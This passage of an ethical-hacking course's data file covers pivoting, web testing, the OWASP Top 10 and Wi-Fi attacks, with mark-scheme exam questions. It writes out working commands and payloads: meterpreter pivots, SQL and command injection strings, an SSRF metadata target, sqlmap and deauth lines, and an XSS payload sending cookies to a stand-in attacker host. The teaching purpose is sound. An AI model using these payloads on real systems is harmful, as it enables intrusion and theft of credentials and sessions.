              "Defences: east-west segmentation, host firewalls on lateral protocols, NDR scan detection, egress filtering.",
            ],
            callout: {
              type: "warning",
              title: "Persistence needs a signature, not stealth",
              body: "When the RoE permits persistence, choose a mechanism the client's SOC can find and the report can remove: a named scheduled task, a documented user, one SSH key in authorized_keys. Stealth persistence in a pentest is a defect - the goal is proving the path, not hiding it.",
            },
            codeExample: {
              language: "bash",
              caption: "pivot.sh - from first shell to the finance tier",
              code: `# on the compromised host: what networks can it see?
ipconfig                # second interface 10.0.3.15/24
arp -a                  # 12 neighbours on 10.0.3.0/24

# meterpreter: route + socks, then scan through it
meterpreter > route add 10.0.3.0/24 1
meterpreter > background
msf6 > use auxiliary/server/socks_proxy   # SRVPORT 1080
proxychains nmap -sT -Pn -n 10.0.3.0/24   # 9 hosts: DB tier

# single-port alternative
meterpreter > portfwd add -l 5432 -p 5432 -r 10.0.3.7`,
            },
            examQuestions: [
              {
                q: "Explain pivoting and maintaining access in post-exploitation. Cover internal network discovery, the tunneling mechanisms with syntax, scanning through the pivot, the RoE asymmetry on persistence, and the segmentation mitigations that defeat pivoting.",
                marks: 14,
                outline: [
                  "Pivoting definition: route attacks through a compromised dual-homed host",
                  "Discovery: ipconfig second interface 10.0.3.0/24, arp -a neighbours",
                  "Tunnels: portfwd single port; autoroute + socks_proxy for arbitrary tools; ssh -D dynamic SOCKS",
                  "Scan through proxy: proxychains nmap -sT -Pn -n via 127.0.0.1:1080 -> 9 DB hosts",
                  "Persistence asymmetry: pentest proves re-access once, reversible and documented; red team runs weeks",
                  "Detection: workstation scanning server VLAN, unusual SMB/RDP sources, SOCKS patterns",
                  "Mitigation: east-west segmentation, host firewalls, NDR, egress filtering - segmentation would have blocked the worked pivot",
                ],
              },
              {
                q: "Why do penetration test rules of engagement usually forbid stealth persistence while red team exercises embrace it?",
                marks: 7,
                outline: [
                  "Pentest goal: prove the chain once, produce evidence, clean up",
                  "Stealth artifacts create unmanaged risk and SOC blind spots",
                  "Red team goal: test detection over time, so persistence is the point",
                  "Bound persistence: reversible, named, removal verified in the report",
                  "Trust: visible cleanup maintains the client relationship",
                ],
              },
            ],
          },
          {
            number: "2.5",
            title: "Introduction to web application security",
            body: [
              "Web applications concentrate the modern attack surface: they are reachable by anyone, stateful, authenticated by humans, and built from layers that each carry their own vulnerability classes. The layered model the exam wants: client-side (browser, JavaScript, DOM - XSS, CSRF, clickjacking), presentation and session layer (cookies, tokens, headers - session fixation, cookie flags), application logic (authorization, business rules - broken access control, price-tampering), data layer (SQL and NoSQL - injection), and infrastructure (web server, TLS, headers - misconfiguration, outdated components). OWASP's Top 10 organizes the same surface by prevalence and risk, and the 2021 edition leads with Broken Access Control (A01) - the category that manual testing finds and scanners routinely miss.",
              "The numbers make the stakes concrete. In an average web-centric engagement, roughly 60-70% of confirmed exploitable findings come from the application layer rather than the network perimeter: one engagement pattern yields 3 access-control flaws (IDOR on /api/invoices/1234 -> 1235 revealing other customers' invoices), 2 injection findings, 1 authentication bypass and 1 SSRF - versus 1-2 network-layer items. Web apps are also the pivot source: the webshell of section 2.1 lives on the web tier, and the internal network is one hop from it. This is why the methodology of section 1.4 dedicates its largest single block (20 of 80 hours) to exploitation of the web surface.",
              "Testing web applications follows a three-mode rhythm: passive mapping (crawl with Burp/ZAP, inventory endpoints, parameters, authentication flows - no attacks), active testing (run the WSTG checklist per endpoint: authentication, session, authorization, input handling, error handling), and exploitation (prove the highest-signal findings with controlled payloads). Tools: Burp Suite (proxy, repeater, intruder, extensions) is the de facto workbench; ZAP is the open-source alternative; sqlmap automates injection; ffuf/gobuster brute-force endpoints and parameters. The mapping artifact matters as much as the attacks - a request inventory with per-endpoint notes is what the report's methodology section references.",
              "Exam framing: 'Explain the web application attack surface and testing approach' is a 7-mark opener for the web unit. Write the five layers with one vulnerability class each, the 60-70% application-layer share as the worked number, the three-mode rhythm, and the tool row (Burp, ZAP, sqlmap, ffuf) - then the next two sections drill the vulnerabilities and the methodology.",
            ],
            keyTerms: [
              { term: "Attack surface", definition: "The set of endpoints, parameters, protocols and components an attacker can reach and influence." },
              { term: "IDOR", definition: "Insecure Direct Object Reference - accessing another user's object by changing an identifier." },
              { term: "Burp Suite", definition: "The standard web testing workbench: intercepting proxy, repeater, intruder, scanner extensions." },
              { term: "OWASP Top 10", definition: "The industry's ranked list of the most critical web application security risk categories." },
            ],
            diagram: {
              kind: "layers",
              title: "The web attack surface, layer by layer",
              caption: "Each layer answers a different WSTG checklist section - test top-down, report by layer.",
              layers: [
                { label: "Client / DOM", note: "XSS, CSRF, clickjacking" },
                { label: "Session layer", note: "cookie flags, fixation, token flaws" },
                { label: "Application logic", note: "broken access control, IDOR, business-rule abuse" },
                { label: "Data layer", note: "SQL/NoSQL injection" },
                { label: "Infrastructure", note: "server misconfig, TLS, outdated components" },
              ],
            },
            bullets: [
              "Five layers: client/DOM, session, application logic, data, infrastructure - each with its own checklist section.",
              "OWASP Top 10 2021: A01 Broken Access Control leads - the manual-testing category scanners miss.",
              "Worked share: 60-70% of exploitable findings in web-centric engagements come from the application layer.",
              "Worked pattern: 3 IDOR, 2 injection, 1 auth bypass, 1 SSRF vs 1-2 network findings.",
              "Three modes: passive mapping -> active checklist testing -> controlled exploitation.",
              "Tools: Burp Suite (workbench), ZAP (open source), sqlmap (injection), ffuf/gobuster (endpoints).",
            ],
            callout: {
              type: "tip",
              title: "Map before you attack",
              body: "The highest-skill web finding - broken access control - is only visible after a complete endpoint map: crawl first, log every endpoint and parameter, note which objects have sequential ids. IDOR testing is then a systematic loop over the map (change 1234 -> 1235 for every object type), not a guess.",
            },
            table: {
              caption: "Layer-to-checklist mapping from the OWASP WSTG.",
              headers: ["Layer", "WSTG section", "Signature vulnerabilities"],
              rows: [
                ["Client / DOM", "Testing Client-Side", "XSS (reflected/stored/DOM), CSRF, clickjacking"],
                ["Session", "Session Management", "Weak cookie flags, fixation, missing expiry"],
                ["Application logic", "Authorization / Business logic", "IDOR, privilege confusion, price tampering"],
                ["Data", "Injection", "SQLi, NoSQLi, template injection"],
                ["Infrastructure", "Configuration / Components", "Directory listing, debug endpoints, old frameworks"],
              ],
            },
            examQuestions: [
              {
                q: "Explain the layered web application attack surface and the three-mode methodology for testing it. Map each layer to its vulnerability classes and checklist, and justify why application-layer findings dominate modern engagements with numbers.",
                marks: 14,
                outline: [
                  "Layers: client/DOM, session, application logic, data, infrastructure",
                  "Per-layer classes: XSS/CSRF; cookie flags/fixation; access control/IDOR; injection; misconfig/old components",
                  "OWASP Top 10 2021: A01 Broken Access Control - manual-first category",
                  "Three modes: passive mapping, active WSTG checklist, controlled exploitation",
                  "Worked share: 60-70% of exploitable findings are application-layer; pattern 3 IDOR + 2 injection + 1 SSRF",
                  "Tools: Burp (proxy/repeater/intruder), ZAP, sqlmap, ffuf",
                  "Web tier is the pivot source: webshell -> internal network hop",
                ],
              },
              {
                q: "What is passive mapping in web testing and why must it precede active testing?",
                marks: 7,
                outline: [
                  "Crawl and inventory: endpoints, parameters, auth flows - no attack traffic",
                  "Produces the endpoint map the report methodology references",
                  "Access-control testing needs the object-id inventory (1234 -> 1235 loop)",
                  "Prevents noisy attacks before understanding the app",
                  "Feeds WSTG checklist selection per endpoint",
                ],
              },
            ],
          },
          {
            number: "2.6",
            title: "Common web application vulnerabilities",
            body: [
              "The OWASP Top 10 is the syllabus's taxonomy and the examiner's mark scheme. Broken Access Control (A01): the server fails to verify that the requester may touch the object - GET /api/invoices/1235 returns another customer's invoice because the id, not the session, decides access; testing is the systematic id-shift loop over the endpoint map. Cryptographic Failures (A02): sensitive data protected with nothing, or with the wrong primitive - passwords stored with MD5, TLS terminated with a weak cipher suite, session tokens in URLs. Injection (A03): untrusted input interpreted as code - SQL injection (' OR '1'='1 closing the WHERE clause), NoSQL injection, OS command injection (; cat /etc/passwd), template injection. Insecure Design (A04) is the category for missing controls a redesign should fix, and Security Misconfiguration (A05) covers directory listings, debug endpoints, default credentials and permissive CORS.",
              "The rest of the list completes the taxonomy: Vulnerable and Outdated Components (A06) - the Log4Shell class, identified by version fingerprinting and confirmed by a safe PoC; Identification and Authentication Failures (A07) - missing rate limiting on /login enabling password spraying at 10 attempts/minute across 500 accounts, weak recovery flows, session fixation; Software and Data Integrity Failures (A08) - unsigned updates and unsafe deserialization; Security Logging and Monitoring Failures (A09) - the test's own 40-attack requests leaving no alert, which is a finding in its own right; and SSRF (A10) - the server fetching an attacker-chosen URL, which on cloud estates targets the metadata endpoint http://169.254.169.254 to steal instance credentials.",
              "The worked exploit pair every answer needs. SQL injection on /item.php?id=1: the payload 1 UNION SELECT username,password FROM users-- concatenates a second query into the response, and sqlmap -u 'http://target/item.php?id=1' --batch --dbs automates detection, enumeration and (if authorized) extraction; the remediation column says parameterized queries. Stored XSS on a comment field: <script>fetch('//attacker/'+document.cookie)</script> fires in every viewer's session - the tester's own account receives the harvested cookie, proving session theft; remediation says output encoding plus a CSP. Both proofs are volume-limited (one row, one cookie - the tester's own) per the RoE discipline of Unit 2.1.",
              "Exam framing: 'Explain the OWASP Top 10 vulnerabilities with examples and countermeasures' is the 14-mark centrepiece of this unit. Table the ten categories with one example and one fix each, work the SQLi and XSS pairs with exact payloads and remediations, and note the tester-side proofs (rate-limit gap, missing log alert) that turn A07/A09 from theory into findings.",
            ],
            keyTerms: [
              { term: "SQL injection", definition: "Untrusted input breaking into SQL syntax - UNION SELECT extends the query, -- comments the tail." },
              { term: "Stored XSS", definition: "Malicious script persisted server-side that executes in every subsequent viewer's session." },
              { term: "SSRF", definition: "Server-Side Request Forgery - tricking the server into fetching attacker-chosen URLs, including cloud metadata." },
              { term: "IDOR", definition: "Access control decided by object id instead of ownership - 1234 -> 1235 leaks other users' records." },
            ],
            diagram: {
              kind: "matrix",
              title: "Prioritizing the Top 10 in an engagement",
              caption: "Plot each category by exploitability and impact; the upper-right quadrant gets the hours.",
              axes: { x: "Exploitability (hard -> trivial)", y: "Business impact (low -> high)" },
              quadrants: [
                { label: "A05 Misconfig, A09 Logging gaps", note: "findings, low direct impact - report and fix" },
                { label: "A01 Access control, A03 Injection", note: "trivial + high impact - exploit and prove" },
                { label: "A04 Insecure design", note: "redesign backlog, no quick exploit" },
                { label: "A02 Crypto failures", note: "impact high, exploitability varies by data" },
              ],
            },
            bullets: [
              "A01 Broken Access Control: id-shift loop proves IDOR on /api/invoices/1235.",
              "A02 Cryptographic Failures: MD5 password storage, weak TLS suites, tokens in URLs.",
              "A03 Injection: SQLi (' OR '1'='1, UNION SELECT), command injection, template injection.",
              "A05/A06: misconfig (directory listing, default creds, permissive CORS) and outdated components (Log4Shell class).",
              "A07: no rate limit on /login -> spraying 500 accounts at 10/min; A09: zero alerts for 40 attack requests.",
              "A10 SSRF: fetch http://169.254.169.254 for cloud instance credentials.",
              "Worked proofs: sqlmap --dbs for SQLi; stored XSS harvesting the tester's own cookie; volume-limited per RoE.",
            ],
            callout: {
              type: "exam",
              title: "Example + payload + remediation per category",
              body: "The 14-mark answer needs all three beats for each category you name: scenario, exact payload or proof, remediation. 'SQLi exists' earns a listing; \"id=1 UNION SELECT username,password FROM users-- returned 2 rows; fix is parameterized queries\" earns the marks.",
            },
            table: {
              caption: "OWASP Top 10 (2021) - the exam table.",
              headers: ["Category", "Signature example", "Primary remediation"],
              rows: [
                ["A01 Broken Access Control", "IDOR: /api/invoices/1235", "Server-side authorization checks"],
                ["A02 Cryptographic Failures", "MD5-stored passwords", "Argon2/bcrypt, TLS 1.2+"],
                ["A03 Injection", "1 UNION SELECT user,password--", "Parameterized queries"],
                ["A04 Insecure Design", "No transfer limit business rule", "Threat-modelled design controls"],
                ["A05 Security Misconfiguration", "Directory listing, debug endpoint", "Hardened baselines, headers"],
                ["A06 Outdated Components", "Log4Shell (CVE-2021-44228)", "SBOM + patch programme"],
                ["A07 Auth Failures", "No rate limit on /login", "Lockout + MFA + throttling"],
                ["A08 Integrity Failures", "Unsigned update channel", "Sign and verify artifacts"],
                ["A09 Logging Failures", "40 attacks, zero alerts", "Detection use cases + SIEM"],
                ["A10 SSRF", "169.254.169.254 metadata fetch", "Egress allow-lists, IMDSv2"],
              ],
            },
            examQuestions: [
              {
                q: "Explain the OWASP Top 10 web application vulnerabilities. For each category give a signature example, a concrete proof technique and the primary remediation; work through SQL injection and stored XSS with exact payloads.",
                marks: 14,
                outline: [
                  "A01: IDOR via id shift (1234 -> 1235); fix = server-side authorization",
                  "A02: MD5 passwords / weak TLS; fix = Argon2, TLS 1.2+",
                  "A03: 1 UNION SELECT username,password FROM users--; fix = parameterized queries",
                  "A04/A05: insecure design vs misconfig (directory listing, debug endpoint)",
                  "A06/A07: outdated Log4Shell class; no rate limit enables 500-account spraying",
                  "A08/A09: unsigned updates; 40 attack requests with zero alerts",
                  "A10: SSRF to 169.254.169.254; fix = IMDSv2, egress allow-lists; stored XSS proof harvesting tester's own cookie",
                ],
              },
              {
                q: "Demonstrate how a UNION-based SQL injection works on /item.php?id=1 and state its remediation.",
                marks: 7,
                outline: [
                  "Input concatenated into the SQL WHERE clause",
                  "Payload 1 UNION SELECT username,password FROM users--",
                  "UNION appends a second result set; -- comments the remainder",
                  "Automated with sqlmap --dbs under authorization",
                  "Remediation: parameterized queries, least-privilege DB user, WAF as compensating control",
                ],
              },
            ],
          },
          {
            number: "2.7",
            title: "Web application testing methodology and scanners",
            body: [
              "The web testing methodology operationalizes section 2.5's rhythm into a checklist-driven pass with tooling. Phase order: map (crawl with Burp/ZAP, enumerate directories and parameters with ffuf: ffuf -u https://target/FUZZ -w wordlist.txt -mc 200), authenticate and role-model (test as user A, note privilege boundaries), then execute the WSTG checklist endpoint-by-endpoint - authentication, session management, authorization (the id-shift loop), input handling (injection payloads from section 2.6), business logic (negative quantities, price tampering, step-skipping in checkout flows), error handling (stack traces in responses). Business-logic testing is the differentiator of skilled testers: no scanner finds 'coupon reuse across accounts' or 'negative quantity inverts the total' - a -2 quantity in a shopping cart that refunds instead of charging is a pure manual finding.",
              "Scanners slot into the methodology as accelerators, not replacements. Burp's active scanner (Pro), ZAP's automated scan, and niche tools (sqlmap for injection, nuclei for CVE PoC templates, Nikto for server misconfig) each cover breadth: a nuclei run with the web-templates pack fires 400+ versioned PoCs in minutes and reliably catches A06 outdated components; sqlmap catches parameter-level injection the generic scanner missed. The composite workflow in a real engagement: ffuf maps 180 endpoints -> nuclei flags 6 known-CVE matches -> Burp scanner adds 14 findings -> manual WSTG pass confirms 9 and adds 5 logic flaws the machines cannot see. The 5 manual logic findings are routinely the report's headline - which is exactly why the syllabus pairs methodology with scanners.",
              "Evidence and repeatability close the loop. Each confirmed finding is captured as a Burp request/response pair or a curl reproduction (curl -H 'Cookie: session=USERA' https://target/api/invoices/1235 -i returning HTTP 200), classified per OWASP, severity-scored with CVSS (section 4.5), and logged into the findings register with the endpoint, payload, screenshot and remediation. The register is what the client's engineering team works from - a finding without a reproduction step is a bug report, not a pentest finding.",
              "Exam framing: 'Explain the web application penetration testing methodology and the tools used' is a 7-14 mark standard. Write the phase order with one tool per phase, the composite workflow numbers (180 endpoints, 6 CVE matches, 14 scanner findings, 5 manual logic flaws), the business-logic differentiator with the negative-quantity example, and the evidence register close.",
            ],
            keyTerms: [
              { term: "WSTG checklist", definition: "OWASP's per-topic test catalogue executed endpoint-by-endpoint." },
              { term: "nuclei", definition: "Template-driven CVE PoC scanner - hundreds of versioned checks in minutes." },
              { term: "Business-logic flaw", definition: "Abuse of intended functionality (negative quantity, coupon reuse) invisible to scanners." },
              { term: "Findings register", definition: "The per-finding log: endpoint, payload, reproduction, CVSS, remediation." },
            ],
            diagram: {
              kind: "pipeline",
              title: "The web testing pipeline with tools",
              caption: "Scanners accelerate every stage; the manual pass supplies what machines cannot see.",
              stages: [
                { label: "Map", note: "Burp/ZAP crawl + ffuf -> 180 endpoints" },
                { label: "Role model", note: "privilege boundaries per user" },
                { label: "Automated scan", note: "nuclei 6 CVEs + Burp 14 findings" },
                { label: "Manual checklist", note: "WSTG confirms 9, adds 5 logic flaws" },
                { label: "Evidence register", note: "repro + CVSS + remediation" },
              ],
            },
            bullets: [
              "Phase order: map -> role model -> automated scan -> manual WSTG pass -> evidence register.",
              "Mapping tools: ffuf/gobuster for directories and parameters, Burp/ZAP for the crawl.",
              "Accelerators: nuclei (400+ PoC templates), sqlmap (parameter injection), Nikto (server misconfig).",
              "Business-logic testing is manual-only: negative quantity, coupon reuse, checkout step-skipping.",
              "Composite worked numbers: 180 endpoints -> 6 CVE matches -> 14 scanner findings -> 9 confirmed + 5 logic flaws.",
              "Evidence per finding: request/response pair or curl repro, CVSS score, remediation, screenshot.",
            ],
            callout: {
              type: "tip",
              title: "Reproduce with curl, not screenshots alone",
              body: "Every finding in the register needs a minimal reproduction the client's engineer can run: a curl command with the exact headers and payload. Screenshots persuade management; repro commands let engineering verify the fix - and re-testing later is then a diff, not a re-engagement.",
            },
            codeExample: {
              language: "bash",
              caption: "webtest.sh - the scanner pass inside the methodology",
              code: `# 1. map: directories + parameters
ffuf -u https://target/FUZZ -w dirs.txt -mc 200,301
ffuf -u "https://target/api/invoice?FUZZ=1" -w params.txt -mr "invoice"

# 2. known-CVE sweep
nuclei -u https://target -t cves/ -severity medium,high,critical

# 3. injection deep-dive on flagged parameters
sqlmap -u "https://target/item.php?id=1" --batch --level 3 --dbs

# 4. manual proof of IDOR (user A reading user B's object)
curl -s -H "Cookie: session=USERA" https://target/api/invoices/1235 -i`,
            },
            examQuestions: [
              {
                q: "Explain the web application penetration testing methodology phase by phase, name the tool used at each phase, and contrast automated scanner findings with manual business-logic findings using the composite engagement numbers.",
                marks: 14,
                outline: [
                  "Map: ffuf directories/params -> 180 endpoints; Burp/ZAP crawl",
                  "Role model: privilege boundaries per user before testing",
                  "Automated: nuclei 6 CVE matches; Burp scanner 14 findings; sqlmap on flagged parameters",
                  "Manual WSTG pass: confirms 9, adds 5 logic flaws machines miss",
                  "Business-logic class: negative quantity, coupon reuse, step-skipping",
                  "Evidence register: curl repro, CVSS, remediation, screenshot",
                  "Rationale: scanners cover breadth (A06 class), manual pass finds A01/A04 class",
                ],
              },
              {
                q: "Give three examples of business-logic vulnerabilities that automated scanners cannot find, with the manual test for each.",
                marks: 7,
                outline: [
                  "Negative quantity: cart accepts -2, refund inversion - test negative inputs per field",
                  "Coupon reuse: same code reapplied across accounts - repeat redemption loop",
                  "Checkout step-skip: jump to confirmation, bypass payment - replay requests out of order",
                  "All three are intended functionality abused, not malformed input",
                  "Detection requires the role model and endpoint map from the mapping phase",
                ],
              },
            ],
          },
        ],
      },
    },
    {
      number: 3,
      roman: "III",
      title: "Wireless Networks and the Human Layer",
      summary:
        "Unit III covers wireless network security - standards from WEP to WPA3, attacks and their countermeasures, testing techniques - and the human layer: social engineering, physical security and their mitigation programmes.",
      chapter: {
        number: "03",
        title: "The RF Flank and the Human Layer",
        intro:
          "Unit III covers wireless concepts, Wi-Fi vulnerabilities and attacks, wireless testing techniques, securing wireless networks, and the social-engineering and physical-security classes with their mitigation programmes.",
        inOneBreath:
          "Wireless runs WEP (dead) to WPA2 (4-way handshake, offline PSK cracking) to WPA3 (SAE, offline dictionary killed); attacks divide by protocol, client, availability and infrastructure, each paired with a control. The crack pipeline is monitor, survey, capture, crack with GPU economics; hardening is 802.1X plus PMF plus VLAN quarantine, verified by re-test. The human layer: phishing's 62/18/3 campaign, FIDO2 as the phishing-resistant backstop, tailgating's 90-second chain, and the measure-fix-retest quarter (18% to 11%, 4 h to 12 min).",
        sections: [
          {
            number: "3.1",
            title: "Wireless network security concepts",
            body: [
              "Wireless security protects data that travels through open air, where anyone within radio range is a passive listener by default; the protocol generations are the syllabus's core taxonomy. WEP (1997) used RC4 with a 24-bit IV and a weak integrity check - broken in theory by 2001 (FMS attack) and in minutes by practice; WPA (2003) was the emergency patch, keeping RC4 with TKIP; WPA2 (2004) moved to AES-CCMP with the 4-way handshake for pairwise keys and remains the deployed default; WPA3 (2018) replaced the handshake's password-derived key exchange with SAE (Dragonfly), adding forward secrecy and killing offline dictionary attacks. Each generation exists because the previous one fell - a fact the examiner rewards when stated as the design lesson: authentication protocols that let the client prove password knowledge without exposing it are the hard problem.",
              "The 4-way handshake under WPA2 is the exam's technical heart and is worth knowing stepwise. The AP sends a nonce (ANonce); the client replies with its nonce (SNonce) and MIC; both sides derive the Pairwise Transient Key (PTK) from PMK + ANonce + SNonce + MACs, where the PMK itself derives from PBKDF2(passphrase, SSID, 4096 iterations); the AP confirms with a GTK encrypted under the PTK. The security consequence that testing exploits: capturing the handshake lets an attacker run PBKDF2 offline for every candidate passphrase - so passphrase entropy is everything, and a 12-character random passphrase resists while 'Password123' falls in minutes. WPA3-SAE changes exactly this: the password is never sent or derivable from the exchange, forcing the attacker into an online (rate-limited) guessing game.",
              "Layered on the protocol generations are the mechanisms the tester maps: WPA2/WPA3-Personal (PSK, every user shares the key - one leaking employee defeats it) versus Enterprise (802.1X with per-user credentials against a RADIUS server, the corporate standard), PMF (Protected Management Frames) which removes most deauth attack surface, and client isolation on guest networks. A worked site survey on a mid-size office typically finds 8-15 SSIDs: 3-4 WPA2-Enterprise corporate, 2 guest (open or PSK), and - the finding - 3-5 forgotten WPA2-PSK networks on printers, HVAC controllers and IoT appliances with weak or vendor-default passphrases. Those forgotten SSIDs are the wireless pivot into the corporate VLAN, which is the story the report tells.",
              "Exam framing: 'Explain wireless security standards' is a 7-mark staple; 'compare WEP, WPA, WPA2 and WPA3' with a table plus the 4-way handshake description is 14. Write the generation table with year, algorithm and kill, walk the handshake's four messages with the PTK/PMK derivation, and close with Personal-vs-Enterprise and the forgotten-IoT-SSID finding.",
            ],
            keyTerms: [
              { term: "WEP", definition: "The 1997 RC4-based standard broken by FMS-era statistical attacks - dead for two decades." },
              { term: "4-way handshake", definition: "The WPA2 exchange deriving the PTK from PMK + nonces; captured handshakes enable offline passphrase cracking." },
              { term: "SAE (WPA3)", definition: "Dragonfly password-authenticated key exchange - forward secrecy, no offline dictionary attack." },
              { term: "802.1X", definition: "Port-based authentication to a RADIUS server; the Enterprise mode replacing shared PSKs." },
            ],
            diagram: {
              kind: "layers",
              title: "The wireless security stack, oldest at the bottom",
              caption: "Each layer was built because the one beneath it broke - and the bottom two still lurk on IoT devices.",
              layers: [
                { label: "WPA3-Personal / Enterprise (2018)", note: "SAE key exchange, PMF default, forward secrecy" },
                { label: "WPA2-Personal / Enterprise (2004)", note: "AES-CCMP, 4-way handshake, still the deployed default" },
                { label: "WPA (2003)", note: "TKIP stopgap on RC4 - deprecated" },
                { label: "WEP (1997)", note: "RC4 + 24-bit IV - broken; still found on printers and IoT" },
                { label: "Open", note: "no encryption; captive portal only" },
              ],
            },
            bullets: [
              "WEP: RC4 + 24-bit IV; FMS (2001) and PTW attacks crack it in minutes - only ever a finding.",
              "WPA2: AES-CCMP + 4-way handshake; PMK = PBKDF2(passphrase, SSID, 4096 iterations).",
              "Handshake capture -> offline PBKDF2 guesses; passphrase entropy decides survival time.",
              "WPA3-SAE: password never derivable from the exchange; Dragonblood (2019) noted residual side channels, since patched.",
              "Personal vs Enterprise: shared PSK vs 802.1X per-user RADIUS authentication.",
              "Survey finding pattern: 3-5 forgotten WPA2-PSK SSIDs on printers/HVAC/IoT with weak passphrases = the wireless pivot.",
            ],
            callout: {
              type: "tip",
              title: "The 4-way handshake is the exam's anchor diagram",
              body: "Draw the four messages with ANonce, SNonce, MIC and the GTK delivery, and annotate the derivation PTK = f(PMK, ANonce, SNonce, MACs). Examiners consistently mark the handshake sketch separately from the standards table - one earns the concept mark, the other the comparison mark.",
            },
            table: {
              caption: "Wireless generations - the comparison table examiners expect.",
              headers: ["Standard", "Year", "Encryption / key exchange", "How it fell"],
              rows: [
                ["WEP", "1997", "RC4, 24-bit IV, CRC-32 ICV", "FMS/PTW statistical attacks - minutes"],
                ["WPA", "2003", "TKIP over RC4, Michael MIC", "Temporary patch; TKIP decomposed"],
                ["WPA2", "2004", "AES-CCMP, 4-way handshake", "Offline PSK cracking via captured handshake; KRACK (2017) fixed by patches"],
                ["WPA3", "2018", "SAE (Dragonfly), PMF, forward secrecy", "Dragonblood side channels (patched); online guessing remains"],
              ],
            },
            examQuestions: [
              {
                q: "Explain the evolution of wireless security standards from WEP to WPA3. Compare encryption and key-exchange mechanisms, describe the WPA2 4-way handshake and its cracking consequence, and explain what WPA3-SAE changes.",
                marks: 14,
                outline: [
                  "WEP: RC4 + 24-bit IV + CRC ICV; FMS 2001 statistical attack, minutes to crack",
                  "WPA: TKIP stopgap over RC4, Michael MIC; deprecated",
                  "WPA2: AES-CCMP; PMK = PBKDF2(passphrase, SSID, 4096 iterations)",
                  "4-way handshake: ANonce -> SNonce+MIC -> PTK derivation -> GTK delivery",
                  "Consequence: captured handshake -> offline PBKDF2 guessing; entropy decides survival",
                  "WPA3-SAE: Dragonfly exchange, forward secrecy, offline dictionary killed; Dragonblood residual risks patched",
                  "Deployment reality: WPA2 default in estates; forgotten WPA2-PSK IoT SSIDs are the tester's pivot",
                ],
              },
              {
                q: "Differentiate WPA2-Personal from WPA2-Enterprise and explain why enterprises must use 802.1X.",
                marks: 7,
                outline: [
                  "Personal: one shared PSK for all users - one leak defeats everyone; no per-user identity",
                  "Enterprise: 802.1X/EAP per-user credentials against RADIUS",
                  "Enterprise gives per-user revocation, auditing and MFA integration",
                  "PSK rotation is operationally impossible at staff scale",
                  "Compliance (PCI, ISO 27001) expects individual accountability",
                ],
              },
            ],
          },
          {
            number: "3.2",
            title: "Wi-Fi vulnerabilities and attacks",
            body: [
              "Wireless attacks divide by target: against the protocol (crack the key exchange), against the client (impersonate the network), and against availability (knock the air down). Protocol attacks: WEP cracking is historical but still examinable (PTW needs ~40,000 IVs); WPA2-PSK falls through the handshake - capture 4 frames with airodump-ng, then aircrack-ng runs PBKDF2 per candidate; the clientless PMKID attack (2018) grabs the AP's first EAPOL message from a client's roaming attempt or an active request and removes the need to wait for a full handshake; WPS with vulnerable PIN implementations falls to Pixie Dust in seconds. Against clients: the evil twin clones a legitimate SSID on a stronger signal and harvests credentials or serves malware; KARMA-style responses answer every probe request; and a captive-portal clone phishes credentials with a lookalike login page.",
              "Availability attacks: deauthentication frames are unauthenticated management frames - aireplay-ng -0 1 -a AP_BSSID -c CLIENT_MAC injects a spoofed 'goodbye' and forces a reconnect whose handshake the attacker captures (the classic pairing with the crack above); PMF (802.11w) in WPA3 and modern WPA2 deployments is the direct counter. RF jamming physically kills the channel but is rarely tested. Against infrastructure: rogue access points plugged into the LAN extend the network's trust to the car park, and misconfigured guest networks bridge straight into corporate VLANs. Each attack has a defender's answer, and the exam rewards presenting them as pairs - attack, tool, tell-tale log artefact, control.",
              "The worked numbers decide the marks. Handshake cracking economics on a modern GPU rig: 8-character lowercase passphrase - minutes; 8-character mixed-case+digits - hours to days; 12-character random - centuries, which is why the mitigation column says length over complexity for PSKs. A rogue-AP finding pattern from a real survey: 2 devices broadcasting the corporate SSID from outside the building perimeter - one an employee's travel router (unsanctioned), one genuinely malicious; the enterprise wireless controller's rogue detection had flagged both for 6 weeks with no one reading the alert, which converts the technical finding into an A09-class process finding.",
              "Exam framing: 'Explain Wi-Fi attacks and their countermeasures' is the 14-mark core of this section. Organize by target (protocol / client / availability / infrastructure), name the tool per attack, give the GPU economics as the worked example, and close with the rogue-AP case showing detection failing on process, not technology.",
            ],
            keyTerms: [
              { term: "Evil twin", definition: "A rogue AP cloning a legitimate SSID to capture clients' traffic and credentials." },
              { term: "Deauthentication attack", definition: "Spoofed management frames forcing clients to reconnect - capturing the handshake they leak." },
              { term: "PMKID attack", definition: "Clientless WPA2-PSK cracking using the AP's first EAPOL frame - no full handshake needed." },
              { term: "Rogue access point", definition: "An unauthorized AP bridging the wired LAN to the outside world." },
            ],
            diagram: {
              kind: "fork",
              title: "Choosing the wireless attack by target",
              caption: "Protocol, client, availability or infrastructure - each branch pairs an attack with a control.",
              start: "Wireless target identified",
              branches: [
                { label: "Protocol: PSK network", outcome: "capture handshake / PMKID -> aircrack-ng offline PBKDF2; control = passphrase length + PMF", good: true },
                { label: "Client: users in range", outcome: "evil twin + captive portal clone; control = 802.1X certificate validation + awareness", good: true },
                { label: "Availability: the channel", outcome: "deauth/jam; control = PMF (802.11w), RF survey", good: true },
                { label: "Infrastructure: the LAN", outcome: "rogue AP bridging; control = controller rogue detection + port security", good: true },
              ],
            },
            bullets: [
              "Protocol attacks: WEP (PTW, ~40k IVs), WPA2 handshake capture + offline PBKDF2, clientless PMKID, WPS Pixie Dust.",
              "Client attacks: evil twin with cloned SSID, KARMA probe responses, captive-portal phishing.",
              "Availability: deauth frames (aireplay-ng -0) - unauthenticated unless PMF enabled.",
              "Infrastructure: rogue APs bridging the LAN; guest networks bridging corporate VLANs.",
              "GPU economics: 8-char lowercase = minutes; 8-char mixed = hours-days; 12-char random = centuries.",
              "Worked process finding: 2 rogue corporate-SSID devices flagged by the controller for 6 weeks, no triage.",
            ],
            callout: {
              type: "warning",
              title: "Deauth is the loudest thing you will do",
              body: "A deauthentication burst is visible to every client and every monitoring tool in range, and it disrupts real users. Restrict it to the RoE window, target specific client MACs rather than broadcast, and warn the client's network team in advance - it is the wireless action most likely to generate an emergency phone call.",
            },
            table: {
              caption: "Attack-control pairs - the exam's comparison table.",
              headers: ["Attack", "Tool", "Defender's tell-tale", "Control"],
              rows: [
                ["Handshake capture + crack", "airodump-ng + aircrack-ng", "EAPOL storms, off-network PBKDF2 rigs", "12+ char passphrase, PMF, 802.1X"],
                ["PMKID clientless crack", "hcxdumptool + hcxtools", "EAPOL M1 requests without association", "Same as above; SAE upgrade"],
